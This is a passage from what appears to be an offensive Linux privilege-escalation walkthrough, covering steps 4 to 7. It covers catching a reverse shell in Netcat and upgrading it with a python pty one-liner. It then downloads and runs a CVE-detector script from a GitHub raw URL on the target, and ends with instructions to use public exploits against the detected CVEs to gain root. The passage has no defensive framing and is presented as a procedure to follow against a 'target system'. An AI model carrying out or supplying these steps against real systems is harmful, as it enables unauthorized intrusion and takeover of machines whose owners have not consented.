## 4. Receive Reverse Shell

- After entering the IP and port, the server will connect back to your machine.
- You will get a reverse shell in your Netcat terminal.

---

## 5. Upgrade to Full TTY Shell

Once connected, upgrade the shell for better control:


python3 -c 'import pty; pty.spawn("/bin/bash")'



(If `python3` is not available, try `python`.)

---

## 6. Download and Run CVE Detector

Download the Linux CVE detector script:

curl https://raw.githubusercontent.com/mrTr1cky/linux_priv_Guid-/refs/heads/main/cve-detector.sh -o cve-detector.sh

Make it executable:
chmod +x cve-detector.sh
Run the script:

It will scan the system for known vulnerabilities (CVEs).

---

## 7. Exploit Detected Vulnerabilities

- After getting the list of CVEs, find public exploits for them.
- Use the exploits to escalate your privileges on the target system.
